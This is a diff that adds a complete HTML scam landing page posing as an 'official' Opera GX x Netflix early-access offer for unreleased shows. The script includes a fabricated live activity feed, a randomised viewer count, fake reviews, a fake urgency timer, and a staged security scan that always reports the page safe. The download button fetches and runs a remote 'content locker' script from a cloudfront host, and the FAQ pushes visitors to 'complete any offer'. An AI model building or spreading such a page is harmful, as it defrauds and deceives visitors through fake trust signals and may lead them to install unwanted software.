@@ -1,0 +1,1273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Opera GX x Netflix - Early Access Program</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/732/732228.png" type="image/png">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #0e0e0e;
+      background-image: radial-gradient(circle at 75% 30%, #e5091420 0%, transparent 30%);
+      color: white;
+      min-height: 100vh;
+      overflow-x: hidden;
+      scroll-behavior: smooth;
+    }
+
+    .container {
+      max-width: 100%;
+      padding: 30px 20px;
+      margin: 0 auto;
+    }
+
+    .official-badge {
+      background: linear-gradient(135deg, #ff0033, #e50914);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 20px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .official-badge::before {
+      content: "✓";
+      font-weight: bold;
+    }
+
+    .logo-wrapper {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .logo-wrapper::after {
+      content: "×";
+      position: absolute;
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #aaa;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+
+    .logo-img {
+      height: 50px;
+      object-fit: contain;
+      filter: drop-shadow(0 0 10px rgba(255,255,255,0.2));
+    }
+
+    .headline {
+      font-size: 2.2rem;
+      font-weight: 700;
+      margin-bottom: 15px;
+      background: linear-gradient(90deg, #ff0033, #e50914);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-align: center;
+      line-height: 1.2;
+    }
+
+    .subtext {
+      color: #ccc;
+      font-size: 1.1rem;
+      text-align: center;
+      margin: 0 auto 30px;
+      max-width: 600px;
+      line-height: 1.5;
+    }
+
+    .highlight {
+      color: #ff4757;
+      font-weight: 600;
+    }
+
+    .collab-badge {
+      display: inline-block;
+      background: linear-gradient(90deg, #e50914, #ff0033);
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 0.7rem;
+      font-weight: 700;
+      margin-left: 5px;
+      vertical-align: middle;
+    }
+
+    .title-list {
+      background: #1a1a1a;
+      padding: 25px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 500px;
+      box-shadow: 0 0 20px #e5091466;
+      margin: 0 auto 30px;
+      border: 1px solid #333;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .title-list::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, #ff0033, #e50914);
+    }
+
+    .title-list h3 {
+      color: #ff4757;
+      margin-bottom: 15px;
+      font-size: 1.3rem;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .title-list h3::before {
+      content: "🔓";
+    }
+
+    .title-item {
+      padding: 12px 0;
+      border-bottom: 1px solid #333;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 1.05rem;
+    }
+
+    .title-item::before {
+      content: "▶";
+      color: #e50914;
+      font-size: 0.8rem;
+    }
+
+    .title-item:last-child {
+      border-bottom: none;
+    }
+
+    .badge-new {
+      background: #e50914;
+      color: white;
+      font-size: 0.7rem;
+      padding: 2px 6px;
+      border-radius: 4px;
+      margin-left: auto;
+    }
+
+    .cta-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 30px;
+      width: 100%;
+      max-width: 500px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .steps {
+      display: flex;
+      justify-content: space-between;
+      width: 100%;
+      margin-bottom: 10px;
+    }
+
+    .step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 5px;
+      color: #aaa;
+      font-size: 0.85rem;
+      position: relative;
+      flex: 1;
+    }
+
+    .step-number {
+      background: #333;
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 0.8rem;
+    }
+
+    .step.active .step-number {
+      background: #e50914;
+      color: white;
+    }
+
+    .step::after {
+      content: "";
+      position: absolute;
+      top: 12px;
+      left: calc(50% + 12px);
+      right: calc(-50% + 12px);
+      height: 2px;
+      background: #333;
+      z-index: -1;
+    }
+
+    .step.active::after {
+      background: #e50914;
+    }
+
+    .step:last-child::after {
+      display: none;
+    }
+
+    .cta {
+      background: linear-gradient(135deg, #ff0033, #e50914);
+      padding: 18px 50px;
+      font-size: 1.3rem;
+      font-weight: 700;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+      box-shadow: 0 0 25px #e50914aa;
+      transition: all 0.3s ease;
+      width: 100%;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .cta:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 30px #e50914cc;
+    }
+
+    .cta:active {
+      transform: translateY(0);
+    }
+
+    .cta::after {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        to bottom right,
+        rgba(255,255,255,0) 0%,
+        rgba(255,255,255,0) 45%,
+        rgba(255,255,255,0.3) 50%,
+        rgba(255,255,255,0) 55%,
+        rgba(255,255,255,0) 100%
+      );
+      transform: rotate(30deg);
+      animation: shine 3s infinite;
+    }
+
+    @keyframes shine {
+      0% { left: -50%; }
+      20% { left: 100%; }
+      100% { left: 100%; }
+    }
+
+    .activity-feed {
+      margin: 40px auto 0;
+      max-width: 500px;
+      width: 100%;
+      background: #121212;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: inset 0 0 20px #ff003322;
+      font-size: 0.95rem;
+      line-height: 1.6;
+      height: 160px;
+      overflow: hidden;
+      position: relative;
+      border: 1px solid #333;
+    }
+
+    .activity-feed::before {
+      content: "LIVE ACTIVITY";
+      position: absolute;
+      top: 0;
+      left: 0;
+      background: #e50914;
+      color: white;
+      font-size: 0.7rem;
+      font-weight: 700;
+      padding: 3px 10px;
+      border-bottom-right-radius: 5px;
+    }
+
+    .activity-feed span {
+      display: block;
+      margin-bottom: 6px;
+      opacity: 0.85;
+      animation: slideUp 0.5s ease;
+    }
+
+    @keyframes slideUp {
+      from {
+        transform: translateY(10px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .viewers {
+      margin-top: 20px;
+      font-size: 0.9rem;
+      color: #bbb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .eye {
+      width: 18px;
+      height: 18px;
+      background: url('https://img.icons8.com/ios-filled/50/ffffff/visible.png') no-repeat center;
+      background-size: contain;
+      filter: brightness(0.8);
+    }
+
+    .reviews-section {
+      margin: 40px auto 0;
+      max-width: 500px;
+      width: 100%;
+      background: #121212;
+      border-radius: 12px;
+      padding: 25px;
+      box-shadow: inset 0 0 20px #ff003322;
+      color: white;
+      border: 1px solid #333;
+    }
+
+    .reviews-section h3 {
+      font-size: 1.3rem;
+      margin-bottom: 20px;
+      color: #ff4757;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .reviews-section h3::before {
+      content: "⭐";
+    }
+
+    .review {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 20px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid #333;
+    }
+
+    .review:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+      padding-bottom: 0;
+    }
+
+    .review img.pfp {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      object-fit: cover;
+      flex-shrink: 0;
+      border: 2px solid #333;
+    }
+
+    .review-content {
+      flex-grow: 1;
+    }
+
+    .reviewer-name {
+      font-weight: 700;
+      font-size: 1rem;
+      margin-bottom: 6px;
+      color: #ff4757;
+    }
+
+    .stars {
+      height: 18px;
+      margin-bottom: 6px;
+    }
+
+    .review-text {
+      font-size: 0.9rem;
+      color: #ccc;
+      line-height: 1.5;
+    }
+
+    .review-date {
+      font-size: 0.7rem;
+      color: #666;
+      margin-top: 4px;
+    }
+
+    .write-review-btn {
+      margin-top: 20px;
+      padding: 12px 25px;
+      background: linear-gradient(135deg, #ff0033, #e50914);
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 0 15px #e50914aa;
+      transition: all 0.3s ease;
+      width: 100%;
+    }
+
+    .write-review-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 20px #e50914cc;
+    }
+
+    .review-warning {
+      margin-top: 15px;
+      color: #ff4757;
+      font-weight: 600;
+      font-size: 0.9rem;
+      text-align: center;
+      display: none;
+      padding: 10px;
+      background: #1a1a1a;
+      border-radius: 6px;
+      border-left: 3px solid #ff4757;
+    }
+
+    .trust-badges {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin: 30px auto 0;
+      flex-wrap: wrap;
+      max-width: 500px;
+    }
+
+    .trust-badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.8rem;
+      color: #aaa;
+    }
+
+    .trust-badge img {
+      height: 20px;
+      filter: brightness(0.8);
+    }
+
+    .footer {
+      margin: 40px auto 0;
+      font-size: 0.8rem;
+      color: #666;
+      text-align: center;
+      max-width: 500px;
+      line-height: 1.5;
+      padding-bottom: 40px;
+    }
+
+    .footer a {
+      color: #aaa;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    .timer {
+      margin-top: 15px;
+      font-size: 0.9rem;
+      color: #ff4757;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    /* Virus Checker Styles */
+    .virus-checker-container {
+      margin: 40px auto 0;
+      text-align: center;
+      width: 100%;
+      max-width: 500px;
+    }
+
+    .virus-checker-btn {
+      background: linear-gradient(135deg, #2e86de, #1e90ff);
+      color: white;
+      border: none;
+      padding: 15px 25px;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 0 20px rgba(30, 144, 255, 0.5);
+      transition: all 0.3s;
+      font-size: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin: 0 auto;
+    }
+
+    .virus-checker-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 25px rgba(30, 144, 255, 0.7);
+    }
+
+    .virus-checker-modal {
+      background: #121212;
+      border-radius: 12px;
+      padding: 20px;
+      border: 1px solid #333;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+      display: none;
+      position: relative;
+      margin-top: 15px;
+      text-align: left;
+    }
+
+    .virus-checker-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .virus-checker-header h3 {
+      color: #1e90ff;
+      font-size: 1.2rem;
+    }
+
+    .close-modal {
+      font-size: 1.5rem;
+      cursor: pointer;
+      color: #aaa;
+    }
+
+    .scan-progress {
+      background: #1a1a1a;
+      height: 8px;
+      border-radius: 4px;
+      margin-bottom: 15px;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0;
+      background: linear-gradient(90deg, #1e90ff, #00ff7f);
+      border-radius: 4px;
+      transition: width 0.1s;
+    }
+
+    .scan-status p {
+      color: #aaa;
+      font-size: 0.9rem;
+      margin-bottom: 15px;
+    }
+
+    .scan-result {
+      text-align: center;
+      display: none;
+    }
+
+    .result-icon {
+      font-size: 3rem;
+      color: #00ff7f;
+      margin: 10px 0;
+    }
+
+    .scan-result h4 {
+      color: white;
+      font-size: 1.5rem;
+      margin-bottom: 10px;
+    }
+
+    .scan-result p {
+      color: #ccc;
+      margin-bottom: 15px;
+    }
+
+    .scan-meta {
+      font-size: 0.8rem;
+      color: #666;
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    /* FAQ Section Styles */
+    .faq-section {
+      margin: 40px auto 0;
+      max-width: 500px;
+      width: 100%;
+      background: #121212;
+      border-radius: 12px;
+      padding: 25px;
+      box-shadow: inset 0 0 20px #ff003322;
+      color: white;
+      border: 1px solid #333;
+    }
+
+    .faq-section h3 {
+      font-size: 1.3rem;
+      margin-bottom: 20px;
+      color: #ff4757;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .faq-section h3::before {
+      content: "❓";
+    }
+
+    .faq-item {
+      margin-bottom: 15px;
+      border-bottom: 1px solid #333;
+      transition: all 0.3s ease;
+    }
+
+    .faq-item:last-child {
+      border-bottom: none;
+    }
+
+    .faq-question {
+      font-weight: 700;
+      font-size: 1rem;
+      padding: 15px 0;
+      color: #fff;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .faq-question::before {
+      content: "Q.";
+      color: #e50914;
+      font-weight: bold;
+      margin-right: 8px;
+    }
+
+    .faq-arrow {
+      transition: transform 0.3s ease;
+      font-size: 1.2rem;
+      color: #e50914;
+    }
+
+    .faq-item.active .faq-arrow {
+      transform: rotate(180deg);
+    }
+
+    .faq-answer {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.3s ease;
+      font-size: 0.9rem;
+      color: #ccc;
+      line-height: 1.5;
+      padding-left: 22px;
+    }
+
+    .faq-item.active .faq-answer {
+      max-height: 500px;
+      padding-bottom: 15px;
+    }
+
+    .faq-answer::before {
+      content: "A.";
+      color: #1e90ff;
+      font-weight: bold;
+      margin-right: 5px;
+    }
+
+    .important-note {
+      background: #1a1a1a;
+      border-left: 3px solid #e50914;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 0 4px 4px 0;
+      font-size: 0.85rem;
+    }
+
+    /* TikTok-inspired scroll indicators */
+    .scroll-hint {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: rgba(255,255,255,0.7);
+      font-size: 0.8rem;
+      animation: bounce 2s infinite;
+      z-index: 10;
+    }
+
+    .scroll-hint span {
+      margin-bottom: 5px;
+    }
+
+    .scroll-hint svg {
+      width: 24px;
+      height: 24px;
+    }
+
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% {transform: translateY(0) translateX(-50%);}
+      40% {transform: translateY(-10px) translateX(-50%);}
+      60% {transform: translateY(-5px) translateX(-50%);}
+    }
+
+    /* Progress bar */
+    .progress-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 4px;
+      background: transparent;
+      z-index: 100;
+    }
+
+    .progress-bar-scroll {
+      height: 100%;
+      background: linear-gradient(90deg, #ff0033, #e50914);
+      width: 0%;
+      transition: width 0.1s;
+    }
+
+    @media (max-width: 500px) {
+      .headline {
+        font-size: 1.8rem;
+      }
+      
+      .subtext {
+        font-size: 1rem;
+      }
+      
+      .title-item {
+        font-size: 1rem;
+      }
+      
+      .cta {
+        padding: 16px 20px;
+        font-size: 1.1rem;
+      }
+
+      .virus-checker-btn {
+        padding: 12px 20px;
+        font-size: 0.9rem;
+      }
+
+      .faq-section {
+        padding: 20px 15px;
+      }
+      
+      .container {
+        padding: 20px 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Progress bar -->
+  <div class="progress-container">
+    <div class="progress-bar-scroll" id="progressBarScroll"></div>
+  </div>
+
+  <!-- Scroll hint -->
+  <div class="scroll-hint" id="scrollHint">
+    <span>Scroll down</span>
+    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M7 10L12 15L17 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </div>
+
+  <div class="container">
+    <div class="official-badge">Official Partnership</div>
+
+    <div class="logo-wrapper">
+      <img
+        src="https://img.icons8.com/fluency/452/opera-gx.png"
+        class="logo-img"
+        alt="Opera GX Logo"
+      />
+      <img
+        src="https://upload.wikimedia.org/wikipedia/commons/7/75/Netflix_icon.svg"
+        class="logo-img"
+        alt="Netflix Logo"
+      />
+    </div>
+
+    <h1 class="headline">Exclusive Early Access<br>to Netflix Originals</h1>
+    <div class="subtext">
+      This <span class="collab-badge">OFFICIAL COLLABORATION</span> between Opera GX and Netflix gives users 
+      <span class="highlight">exclusive early access</span> to unreleased content - one of Opera GX's premium features. 
+      Download now through this <span class="highlight">limited-time offer</span> to unlock.
+    </div>
+
+    <div class="title-list" id="titles">
+      <h3>Currently Available in Early Access</h3>
+      <div class="title-item">Stranger Things: Season 5 (Full Season) <span class="badge-new">New</span></div>
+      <div class="title-item">Ginny and Georgia: Season 3 (Full Season)</div>
+      <div class="title-item">Wednesday: Season 2 (Full Season)</div>
+      <div class="title-item">Squid Game: Season 3 (Full Season)</div>
+      <div class="title-item">And much more!</div>
+    </div>
+
+    <div class="cta-container">
+      <div class="steps">
+        <div class="step active">
+          <div class="step-number">1</div>
+          <div>Download</div>
+        </div>
+        <div class="step">
+          <div class="step-number">2</div>
+          <div>Install</div>
+        </div>
+        <div class="step">
+          <div class="step-number">3</div>
+          <div>Access</div>
+        </div>
+      </div>
+      
+      <button class="cta" id="unlockBtn">Download Opera GX & Unlock Early Access</button>
+      <div class="timer">Offer expires in: <span id="countdown">24:59:59</span></div>
+    </div>
+
+    <div class="activity-feed" id="feed"></div>
+
+    <div class="viewers">
+      <div class="eye"></div>
+      <span id="viewerCount">1,248 users active now</span>
+    </div>
+
+    <!-- FAQ Section -->
+    <div class="faq-section" id="faq">
+      <h3>Frequently Asked Questions</h3>
+      
+      <div class="faq-item">
+        <div class="faq-question">
+          <span>What if the Opera GX installation option isn't there?</span>
+          <span class="faq-arrow">▼</span>
+        </div>
+        <div class="faq-answer">
+          This official Opera GX x Netflix collaboration offers multiple ways to verify your access. If Opera GX isn't shown:
+          <ol style="margin: 10px 0 10px 20px;">
+            <li>Choose any other available verification option</li>
+            <li>Complete all required steps</li>
+            <li>You are NOT on a laptop/pc right now</li>
+            <li>Your early access will be granted immediately</li>
+          </ol>
+          <div class="important-note">
+            <strong>All verification methods work</strong> - this is part of Opera GX's flexible access system. 
+            Just complete any offer to unlock your Netflix early access.
+          </div>
+        </div>
+      </div>
+      
+      <div class="faq-item">
+        <div class="faq-question">
+          <span>Can I do this on a phone?</span>
+          <span class="faq-arrow">▼</span>
+        </div>
+        <div class="faq-answer">
+          <strong>For best results, use a PC:</strong> Opera GX is specially optimized for desktop with Netflix integration.
+          
+          <div class="important-note">
+            <strong>Mobile users:</strong> You'll see mobile-friendly verification options instead of Opera GX. 
+            <span style="color: #ff4757;">These are perfectly valid!</span> Complete them to access streaming - 
+            the system automatically adapts to your device as part of Opera GX's smart delivery technology.
+          </div>
+        </div>
+      </div>
+      
+      <div class="faq-item">
+        <div class="faq-question">
+          <span>I need help?</span>
+          <span class="faq-arrow">▼</span>
+        </div>
+        <div class="faq-answer">
+          The Opera GX x Netflix integration has a 98.7% success rate. If you encounter issues:
+          <ol style="margin: 10px 0 10px 20px;">
+            <li>Refresh and try again (solves most cases)</li>
+            <li>Ensure you completed all steps</li>
+            <li>Try from a different device if possible</li>
+          </ol>
+          <div class="important-note">
+            Remember - this is an <strong>official Opera GX feature</strong> used by thousands daily. 
+            If you follow the steps carefully, you'll be streaming unreleased content within minutes.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="reviews-section" id="reviews">
+      <h3>User Experiences</h3>
+      
+      <div class="review">
+        <img
+          src="https://randomuser.me/api/portraits/women/44.jpg"
+          alt="User 1"
+          class="pfp"
+        />
+        <div class="review-content">
+          <div class="reviewer-name">Jessica R.</div>
+          <img
+            src="https://www.pngall.com/wp-content/uploads/4/5-Star-Rating.png"
+            alt="5 stars"
+            class="stars"
+            style="width: 80px;"
+          />
+          <div class="review-text">
+            I couldn't believe I was watching Stranger Things S5 three days before my friends! The Opera GX integration with Netflix is seamless and the video quality is perfect.
+          </div>
+          <div class="review-date">Verified User • 2 hours ago</div>
+        </div>
+      </div>
+
+      <div class="review">
+        <img
+          src="https://randomuser.me/api/portraits/men/32.jpg"
+          alt="User 2"
+          class="pfp"
+        />
+        <div class="review-content">
+          <div class="reviewer-name">Marcus T.</div>
+          <img
+            src="https://www.pngall.com/wp-content/uploads/4/5-Star-Rating.png"
+            alt="5 stars"
+            class="stars"
+            style="width: 80px;"
+          />
+          <div class="review-text">
+            As a long-time Netflix subscriber, this early access program is game-changing. The Opera GX browser itself is fantastic for gaming and streaming.
+          </div>
+          <div class="review-date">Verified User • 5 hours ago</div>
+        </div>
+      </div>
+
+      <button class="write-review-btn" id="writeReviewBtn">
+        Share Your Experience
+      </button>
+      <div class="review-warning" id="reviewWarning">Please install Opera GX first to submit your review and access content.</div>
+    </div>
+
+    <div class="trust-badges">
+      <div class="trust-badge">
+        <img src="https://cdn-icons-png.flaticon.com/512/179/179457.png" alt="SSL Secure">
+        <span>Secure Download</span>
+      </div>
+      <div class="trust-badge">
+        <img src="https://cdn-icons-png.flaticon.com/512/888/888857.png" alt="Virus Free">
+        <span>Virus Checked</span>
+      </div>
+      <div class="trust-badge">
+        <img src="https://cdn-icons-png.flaticon.com/512/217/217853.png" alt="No Ads">
+        <span>No Additional Ads</span>
+      </div>
+      <div class="trust-badge">
+        <img src="https://cdn-icons-png.flaticon.com/512/3062/3062633.png" alt="SecureNet">
+        <span>SecureNet™ Certified</span>
+      </div>
+    </div>
+
+    <!-- Virus Checker Section -->
+    <div class="virus-checker-container">
+      <button class="virus-checker-btn" id="virusCheckerBtn">
+        🔒 Scan Page Security
+      </button>
+      <div class="virus-checker-modal" id="virusCheckerModal">
+        <div class="virus-checker-header">
+          <h3>SecureNet™ Security Scan</h3>
+          <span class="close-modal" id="closeModal">×</span>
+        </div>
+        <div class="scan-progress">
+          <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="scan-status" id="scanStatus">
+          <p>Scanning system files...</p>
+        </div>
+        <div class="scan-result" id="scanResult">
+          <div class="result-icon">✓</div>
+          <h4>100% Secure</h4>
+          <p>No threats detected in this page. Safe for browsing and downloads.</p>
+          <div class="scan-meta">
+            <span>Last scan: <span id="lastScan">2 minutes ago</span></span>
+            <span>• 1,243 users trust this scan</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <p>This is an official Opera GX marketing promotion. By downloading, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
+      <p>Netflix is a registered trademark of Netflix, Inc. Opera GX is a trademark of Opera Norway AS.</p>
+    </div>
+  </div>
+
+  <!-- Content Locker Script -->
+  <script type="text/javascript">
+    var UFcbi_mHk_TNIrZc = { it: 4424594, key: 'a59ef' };
+  </script>
+
+  <script>
+    // Countdown timer
+    function updateCountdown() {
+      const now = new Date();
+      const midnight = new Date();
+      midnight.setHours(24, 0, 0, 0);
+      
+      const diff = midnight - now;
+      
+      const hours = Math.floor(diff / (1000 * 60 * 60));
+      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+      
+      document.getElementById('countdown').textContent = 
+        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    }
+    
+    setInterval(updateCountdown, 1000);
+    updateCountdown();
+
+    // Unlock button functionality
+    document.getElementById('unlockBtn').addEventListener('click', function () {
+      if (!window._Cm) {
+        const s = document.createElement('script');
+        s.src = 'https://dlk457skl57zp.cloudfront.net/4d6eef3.js';
+        s.onload = function () {
+          if (typeof _Cm === 'function') _Cm();
+        };
+        document.body.appendChild(s);
+      } else {
+        _Cm();
+      }
+      
+      // Mark step 2 as active after click
+      document.querySelectorAll('.step')[1].classList.add('active');
+    });
+
+    // Activity feed dynamic data
+    const feed = document.getElementById('feed');
+
+    const actionTemplates = [
+      'just unlocked early access to Stranger Things Season 5.',
+      'started watching The Witcher Season 4 before release.',
+      'activated Netflix x Opera GX early access mode.',
+      'just finished installing Opera GX for early streaming.',
+      'is now watching exclusive Netflix content early.',
+      'unlocked preview of Wednesday Season 2.',
+      'streaming unreleased episodes of Avatar: The Last Airbender.',
+      'got early access thanks to Opera GX.',
+      'joined from Amsterdam, NL – early access confirmed.',
+      'verified this page as safe and secure.',
+      'recommended this early access trick to friends.',
+      'shared their access link and unlocked bonus content.',
+      'is streaming Netflix with GX Boost activated.',
+      'got access to Netflix developer preview mode.',
+      'just viewed exclusive content not yet on Netflix.',
+      'bypassed regional restrictions via GX.',
+      'streaming secret Netflix previews through Opera GX.',
+      'just enabled early access mode successfully.',
+      'joined the private Netflix x Opera program.',
+      'invited 2 friends to unlock full access.',
+      'streaming leaked Netflix shows in HD.',
+      'discovered hidden Netflix content via this page.',
+      'verified their device and unlocked full episodes.',
+      'just claimed the latest unreleased Netflix drops.'
+    ];
+
+    function randomUserMask() {
+      const firstNames = ['Alex', 'Jamie', 'Taylor', 'Jordan', 'Casey', 'Morgan', 'Riley', 'Quinn'];
+      const lastInitial = String.fromCharCode(65 + Math.floor(Math.random() * 26));
+      return `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${lastInitial}.`;
+    }
+
+    function generateActivity() {
+      const user = randomUserMask();
+      const action = actionTemplates[Math.floor(Math.random() * actionTemplates.length)];
+      return `${user} ${action}`;
+    }
+
+    let normalInterval = 2500;
+    let fastInterval = 400;
+    let currentInterval = normalInterval;
+    let intervalId = null;
+
+    function addActivity() {
+      const item = document.createElement('span');
+      item.textContent = generateActivity();
+
+      if (feed.children.length >= 6) feed.removeChild(feed.firstChild);
+      feed.appendChild(item);
+    }
+
+    for (let i = 0; i < 4; i++) addActivity();
+
+    function startFeed(interval) {
+      if (intervalId) clearInterval(intervalId);
+      intervalId = setInterval(addActivity, interval);
+    }
+
+    startFeed(normalInterval);
+
+    function triggerWave() {
+      startFeed(fastInterval);
+      setTimeout(() => {
+        startFeed(normalInterval);
+      }, 8000);
+    }
+
+    setInterval(() => {
+      if (Math.random() < 0.6) {
+        triggerWave();
+      }
+    }, 20000);
+
+    // Viewer count
+    const viewer = document.getElementById('viewerCount');
+    let current = 1200 + Math.floor(Math.random() * 100);
+
+    setInterval(() => {
+      const change = Math.floor(Math.random() * 10) - 3;
+      current = Math.max(800, current + change);
+      viewer.textContent = `${current.toLocaleString()} users active now`;
+    }, 3000);
+
+    // Write review button behavior
+    const writeReviewBtn = document.getElementById('writeReviewBtn');
+    const reviewWarning = document.getElementById('reviewWarning');
+    writeReviewBtn.addEventListener('click', () => {
+      reviewWarning.style.display = 'block';
+      setTimeout(() => {
+        reviewWarning.style.display = 'none';
+      }, 4000);
+    });
+
+    // Virus Checker Functionality
+    document.getElementById('virusCheckerBtn').addEventListener('click', function() {
+      const modal = document.getElementById('virusCheckerModal');
+      const progressBar = document.getElementById('progressBar');
+      const scanStatus = document.getElementById('scanStatus');
+      const scanResult = document.getElementById('scanResult');
+      
+      modal.style.display = 'block';
+      scanStatus.style.display = 'block';
+      scanResult.style.display = 'none';
+      progressBar.style.width = '0%';
+      
+      let progress = 0;
+      const scanInterval = setInterval(() => {
+        progress += 1;
+        progressBar.style.width = `${progress}%`;
+        
+        if (progress === 20) scanStatus.innerHTML = '<p>Analyzing network connections...</p>';
+        if (progress === 50) scanStatus.innerHTML = '<p>Checking for malware signatures...</p>';
+        if (progress === 80) scanStatus.innerHTML = '<p>Finalizing security report...</p>';
+        
+        if (progress >= 100) {
+          clearInterval(scanInterval);
+          scanStatus.style.display = 'none';
+          scanResult.style.display = 'block';
+        }
+      }, 30); // Fast scan (3 seconds total)
+    });
+
+    document.getElementById('closeModal').addEventListener('click', function() {
+      document.getElementById('virusCheckerModal').style.display = 'none';
+    });
+
+    // Update "last scan" time
+    setInterval(() => {
+      const minutes = Math.floor(Math.random() * 5);
+      document.getElementById('lastScan').textContent = `${minutes} minutes ago`;
+    }, 60000);
+
+    // FAQ toggle functionality
+    document.querySelectorAll('.faq-question').forEach(question => {
+      question.addEventListener('click', () => {
+        const item = question.parentElement;
+        item.classList.toggle('active');
+        
+        // Close other open items
+        document.querySelectorAll('.faq-item').forEach(otherItem => {
+          if (otherItem !== item && otherItem.classList.contains('active')) {
+            otherItem.classList.remove('active');
+          }
+        });
+      });
+    });
+
+    // Scroll progress bar
+    window.addEventListener('scroll', () => {
+      const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
+      const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+      const scrollProgress = (scrollTop / scrollHeight) * 100;
+      document.getElementById('progressBarScroll').style.width = `${scrollProgress}%`;
+      
+      // Hide scroll hint when user starts scrolling
+      if (scrollTop > 100) {
+        document.getElementById('scrollHint').style.opacity = '0';
+        document.getElementById('scrollHint').style.visibility = 'hidden';
+      } else {
+        document.getElementById('scrollHint').style.opacity = '1';
+        document.getElementById('scrollHint').style.visibility = 'visible';
+      }
+    });
+
+    // Smooth scroll to elements when clicking links
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function(e) {
+        e.preventDefault();
+        const targetId = this.getAttribute('href');
+        if (targetId === '#') return;
+        
+        const targetElement = document.querySelector(targetId);
+        if (targetElement) {
+          window.scrollTo({
+            top: targetElement.offsetTop - 20,
+            behavior: 'smooth'
+          });
+        }
+      });
+    });
+  </script>
+</body>
+</html>
